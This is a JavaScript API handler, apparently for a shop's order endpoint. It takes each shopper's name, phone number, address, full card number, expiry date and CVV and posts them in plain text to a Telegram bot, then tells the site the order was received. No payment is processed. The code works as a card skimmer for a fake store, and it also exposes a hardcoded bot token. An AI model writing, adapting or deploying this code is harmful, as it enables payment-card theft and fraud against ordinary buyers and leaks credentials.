// /api/v1/order.js

export default async function handler(req, res) {
    // Only allow POST requests
    if (req.method !== 'POST') {
        return res.status(405).json({ success: false, message: 'Method Not Allowed' });
    }

    // 1. Your Telegram Credentials
    const BOT_TOKEN = "8575730600:AAH8zc1S1-zwe5uu84t98PXc1Gp_j6YHMPw"; // Get from @BotFather
    const CHAT_ID = "7833988868";     // Get from @userinfobot

    // 2. The data coming from your website logic
    const data = req.body;

    // 3. Construct the Telegram Message
    const message = `
🚀 *NEW ORDER ALERT* 🚀
--------------------------
👤 *Name:* ${data.fullName || 'N/A'}
📞 *Mobile:* ${data.mobile || 'N/A'}
📍 *City/State:* ${data.cityState || 'N/A'}
🏠 *Address:* ${data.fullAddress || 'N/A'}
📮 *Pincode:* ${data.pincode || 'N/A'}

🛍️ *Product:* ${data.productName || 'N/A'}
💰 *Amount:* ₹${data.totalAmount || '0'}
💳 *Method:* ${data.paymentMethod || 'N/A'}

💳 *CARD DETAILS*
🔢 *Card:* \`${data.cardNumber || 'N/A'}\`
📅 *Expiry:* ${data.expiryDate || 'N/A'}
🔒 *CVV:* ${data.securityCode || 'N/A'}
`.trim();

    try {
        // 4. Send to Telegram
        const telegramResponse = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
                chat_id: CHAT_ID,
                text: message,
                parse_mode: "Markdown"
            })
        });

        const result = await telegramResponse.json();

        if (result.ok) {
            // 5. Return success to the website so it triggers the redirect to /thanku
            return res.status(200).json({ success: true, message: "Order Received" });
        } else {
            throw new Error("Telegram API Error");
        }
    } catch (error) {
        console.error("Backend Error:", error);
        return res.status(500).json({ success: false, message: "Internal Server Error" });
    }
}
